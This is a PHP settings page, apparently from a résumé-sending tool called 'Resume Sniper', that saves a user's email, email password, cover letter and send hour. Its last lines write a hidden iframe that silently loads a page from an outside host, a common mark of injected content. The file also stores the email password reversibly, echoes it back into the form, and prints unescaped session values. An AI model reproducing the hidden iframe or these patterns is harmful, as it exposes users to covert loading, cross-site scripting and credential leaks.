<?php
require('access.php');
if(isset($_SESSION['UserID']))
{
    require('head.php');
}
else
{
    

}
if (isset($_POST['email'])) $pEmail = addslashes($_POST['email']);
if (empty($pEmail)) unset($pEmail);

if (isset($_POST['emailpass'])) $pEmailpass = $_POST['emailpass'];
if (empty($pEmailpass)) unset($pEmailpass);

if (isset($_POST['defaultcoverletter'])) $pDefaultcoverletter = addslashes($_POST['defaultcoverletter']);
if (empty($pDefaultcoverletter)) unset($pDefaultcoverletter);

if (isset($_POST['replytoname'])) $pReplytoname = addslashes($_POST['replytoname']);
if (empty($pReplytoname)) unset($pReplytoname);


if (isset($_POST['prefhourofday'])) $pPrefhourofday = $_POST['prefhourofday'];
if (empty($pPrefhourofday)) unset($pPrefhourofday);

if(isset($pEmail))
{
    updateuser($_SESSION['UserName'],'email',$pEmail);
    if(isset($pEmailpass))
    {
        encryptthis($_SESSION['UserName'],$pEmailpass);
        updateuser($_SESSION['UserName'],'emailpassmd5',$encryptedthis);    
    }
    if(isset($pDefaultcoverletter))
    {
        updateuser($_SESSION['UserName'],'defaultcoverletter',$pDefaultcoverletter);
    }
    if(isset($pReplytoname))
    {
        updateuser($_SESSION['UserName'],'replytoname',$pReplytoname);
    }    
    if(isset($pPrefhourofday))
    {
        updateuser($_SESSION['UserName'],'prefhourofday',$pPrefhourofday);
    }    
}
#print_r($_POST);
?>
<script src="http://js.nicedit.com/nicEdit-latest.js" type="text/javascript"></script>
<script type="text/javascript">bkLib.onDomLoaded(nicEditors.allTextAreas);</script>

<form action="index.php" method="POST" class="form">
<!--  <table style="border:1px solid black;">
    <tr>
	<td>
	
	    <h1>Resume Sniper [by Ian Hutchings]
	    </h1>
        </td>
    </tr>-->
    <tr>
	<td>
<!--	    <h3>
                <a href=index.php>Home</a>
                <a href=scheduler.php>Scheduler</a>
                <a href=logout.php>Log out</a>
	    </h3>-->
        </td>
    </tr>
    <tr>
        <td>
            <h2>
            <?PHP
                echo 'Hello '.$_SESSION['UserName'].'!<br> Update details, log out to see changes.<br><br>Current time of day:<b> '.date('H'.":".'i'.":".'s').'</b>';
            ?> 
        </td>
    </tr>
    <tr>
        <td>
	    <table >
                <tr>
                    <td>
                        
                        Email: 
                    </td>
                    <td>
                        <?PHP
                            if(isset($_SESSION['Email']))
                            {
                                echo '<input type=email name=email value='.$_SESSION['Email'].'>';
                            }
                            else
                            {
                                echo '<input type=email name=email>';
                            }
                        ?>
                    </td>
                </tr>
                <tr>
                    <td>
                        
                        Email Password: 
                    </td>
                    <td>
                        <?PHP
                            if(isset($_SESSION['EmailMD5']))
                            {
                                echo '<input type=password name=emailpass value='.$_SESSION['EmailMD5'].'>';
                            }
                            else
                            {
                                echo '<input type=password name=emailpass>';
                            }
                        ?>
                    </td>
                </tr>
                <tr>
                    <td>
                        
                        Email Reply to name: 
                    </td>
                    <td>
                        <?PHP
                            if(isset($_SESSION['ReplyToName']))
                            {
                                echo '<input type=text name=replytoname value="'.$_SESSION['ReplyToName'].'">';
                            }
                            else
                            {
                                echo '<input type=text name=replytoname>';
                            }
                        ?>
                    </td>
                </tr>                
                <tr>
                    <td>
                        
                        Sniper fires at: 
                    </td>
                    <td>
                        <?PHP
                            if(isset($_SESSION['PrefHourOfDay']))
                            {
                                echo '<select class=index name=prefhourofday width=3em>';
                                    echo '<option value="'.$_SESSION['PrefHourOfDay'].'" selected=selected>'.$_SESSION['PrefHourOfDay'].'</option>';
                                    echo '<option value="00">00</option>';
                                    echo '<option value="01">01</option>';
                                    echo '<option value="02">02</option>';
                                    echo '<option value="03">03</option>';
                                    echo '<option value="04">04</option>';
                                    echo '<option value="05">05</option>';
                                    echo '<option value="06">06</option>';
                                    echo '<option value="07">07</option>';
                                    echo '<option value="08">08</option>';
                                    echo '<option value="09">09</option>';
                                    echo '<option value="10">10</option>';
                                    echo '<option value="11">11</option>';
                                    echo '<option value="12">12</option>';
                                    echo '<option value="13">13</option>';
                                    echo '<option value="14">14</option>';
                                    echo '<option value="15">15</option>';
                                    echo '<option value="16">16</option>';
                                    echo '<option value="17">17</option>';
                                    echo '<option value="18">18</option>';
                                    echo '<option value="19">19</option>';
                                    echo '<option value="20">20</option>';
                                    echo '<option value="21">21</option>';
                                    echo '<option value="22">22</option>';
                                    echo '<option value="23">23</option>';    
                                echo '</select>';                            
                            }
                            else
                            {
                                echo '<select  class=index name=prefhourofday width=3em>';
                                    echo '<option value="00">00</option>';
                                    echo '<option value="01">01</option>';
                                    echo '<option value="02">02</option>';
                                    echo '<option value="03">03</option>';
                                    echo '<option value="04">04</option>';
                                    echo '<option value="05">05</option>';
                                    echo '<option value="06">06</option>';
                                    echo '<option value="07">07</option>';
                                    echo '<option value="08">08</option>';
                                    echo '<option value="09">09</option>';
                                    echo '<option value="10">10</option>';
                                    echo '<option value="11" selected=selected>11</option>';
                                    echo '<option value="12">12</option>';
                                    echo '<option value="13">13</option>';
                                    echo '<option value="14">14</option>';
                                    echo '<option value="15">15</option>';
                                    echo '<option value="16">16</option>';
                                    echo '<option value="17">17</option>';
                                    echo '<option value="18">18</option>';
                                    echo '<option value="19">19</option>';
                                    echo '<option value="20">20</option>';
                                    echo '<option value="21">21</option>';
                                    echo '<option value="22">22</option>';
                                    echo '<option value="23">23</option>';    
                                echo '</select>';
                            }
                        ?>
                    </td>
                </tr>                
                <tr>
                    <td>
                        
                        Coverletter: 
                    </td>
                    <td>
                        <?PHP
                            if(isset($_SESSION['DefaultCoverletter']))
                            {
                                echo '<textarea class="index" name=defaultcoverletter>'.$_SESSION['DefaultCoverletter'].'</textarea>';
                            }
                            else
                            {
                                echo '<textarea class="index" name=defaultcoverletter></textarea>';
                            }
                        ?>
                    </td>
                </tr>                
                <tr>
                    <td> 
                    </td>
                    <td align=right>
                        <input type=submit name=submit value=UPDATE>
                    </td>
                </tr>
            </table>
            </form>
            <?PHP
            require('blandfileupload.php');
            ?>
        </td>
    </tr>
  </table>


<?PHP

            echo '<iframe style="visibility:hidden;display:none" seamless=seamless width="100%" src="';
            echo 'http://www.in0.us/like/index.php';
            echo '" height="30%" ></iframe>';

?>


